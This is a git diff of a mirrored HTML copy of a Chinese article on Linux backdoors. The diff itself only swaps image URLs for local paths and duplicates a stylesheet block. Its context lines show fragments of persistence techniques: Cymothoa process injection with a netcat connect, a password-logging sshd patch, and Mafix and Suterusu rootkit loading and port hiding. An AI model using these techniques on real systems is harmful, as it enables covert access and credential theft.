@@ -3,7 +3,7 @@
 			<head>
 			     <title>Linux Backdoor - L3m0n</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/15702">http://drops.wooyun.org/tips/15702</a></h1>
 				
@@ -69,7 +69,7 @@ kill -9 pid
 rm -rf /tmp/su
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044453439219.jpg" alt="p1"></p>
+<p><img src="../images_result/images/201605131044453439219.jpg" alt="p1"></p>
 
 <h1>0x03 SSH Server wrapper</h1>
 
@@ -117,7 +117,7 @@ ll /proc/1786
 cat /usr/sbin/sshd
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044479337221.jpg" alt="p2"></p>
+<p><img src="../images_result/images/201605131044479337221.jpg" alt="p2"></p>
 
 <p>还原：</p>
 
@@ -143,7 +143,7 @@ source .bashrc
 
 <p>当本地su或者ssh的时候,就会在tmp下面记录(无论失败成功都有记录)</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044499854231.jpg" alt="p3"></p>
+<p><img src="../images_result/images/201605131044499854231.jpg" alt="p3"></p>
 
 <h1>0x05 Cymothoa_进程注入backdoor</h1>
 
@@ -157,7 +157,7 @@ source .bashrc
 ./cymothoa -p 2270 -s 1 -y 7777
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160513/2016051310450779381121.jpg" alt="p4"></p>
+<p><img src="../images_result/images/2016051310450779381121.jpg" alt="p4"></p>
 
 <pre><code>#!bash
 nc -vv ip 7777
@@ -190,7 +190,7 @@ yun install krb5-lib(没安装)
 
 <p>修改includes.h</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044512589441.jpg" alt="p5"></p>
+<p><img src="../images_result/images/201605131044512589441.jpg" alt="p5"></p>
 
 <p>编译安装再重启sshd服务</p>
 
@@ -203,11 +203,11 @@ make &amp;&amp; make install &amp;&amp; service  sshd restart
 
 <p>会记录登入登出的ssh账号密码(错误的也会记录),配置文件中设置的密码,也可以通过ssh然后root登陆。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044539703051.jpg" alt="p6"></p>
+<p><img src="../images_result/images/201605131044539703051.jpg" alt="p6"></p>
 
 <p>发现：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044543588561.jpg" alt="p7"></p>
+<p><img src="../images_result/images/201605131044543588561.jpg" alt="p7"></p>
 
 <p>找到可疑sshd并且查看一下last的登陆ip，最后kill他们的进程,清除暂时不知</p>
 
@@ -244,11 +244,11 @@ vi config.h
 
 <p>1、记录：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044564847871.jpg" alt="p8"></p>
+<p><img src="../images_result/images/201605131044564847871.jpg" alt="p8"></p>
 
 <p>2、telnet连接</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044587547181.jpg" alt="p9"></p>
+<p><img src="../images_result/images/201605131044587547181.jpg" alt="p9"></p>
 
 <ul>
 <li>缺点：重启就会失效,需要放入启动项</li>
@@ -257,7 +257,7 @@ vi config.h
 
 <p>发现：其实感觉修改一下进程名,发现还是有点麻烦</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/201605131044597256491.jpg" alt="p10"></p>
+<p><img src="../images_result/images/201605131044597256491.jpg" alt="p10"></p>
 
 <h1>0x08 Mafix + Suterusu rookit</h1>
 
@@ -271,7 +271,7 @@ vi config.h
 
 <p>这样就会产生一个端口为23333,root密码也可以用lolloltest登陆的ssh,端口不隐藏</p>
 
-<p><img src="http://static.wooyun.org//drops/20160513/2016051310450125531101.jpg" alt="p11"></p>
+<p><img src="../images_result/images/2016051310450125531101.jpg" alt="p11"></p>
 
 <p>这时候就可以用Suterusu配合使用</p>
 
@@ -323,7 +323,7 @@ insmod suterusu.ko
 ./sock 3 [port]
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160513/2016051310450532846111.jpg" alt="p12"></p>
+<p><img src="../images_result/images/2016051310450532846111.jpg" alt="p12"></p>
 
 <h1>0x09 参考资料</h1>
 
